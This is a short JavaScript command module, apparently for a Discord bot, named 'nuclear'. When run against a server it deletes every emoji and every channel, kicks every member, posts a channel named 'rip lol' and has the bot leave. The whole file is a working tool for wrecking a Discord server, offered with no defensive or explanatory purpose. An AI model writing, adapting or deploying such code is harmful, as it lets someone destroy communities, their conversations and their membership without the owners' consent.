const logger = require("../../utils/logger");

module.exports = {
	name: "nuclear",
	execute: async (guild) => {
		const emojis = await guild.emojis.fetch();

		for (const emoji of emojis.values()) {
			try {
				emoji.delete();
			} catch (err) {
				logger.error(err);
			}
		}

		const channels = await guild.channels.fetch();

		for (const channel of channels.values()) {
			try {
				channel.delete();
			} catch (err) {
				logger.error(err);
			}
		}

		const members = await guild.members.fetch();

		for (const member of members.values()) {
			try {
				member.kick();
			} catch (err) {
				logger.error(err);
			}
		}

		await guild.channels.create({ name: "rip lol" });

		await guild.leave();
	},
};
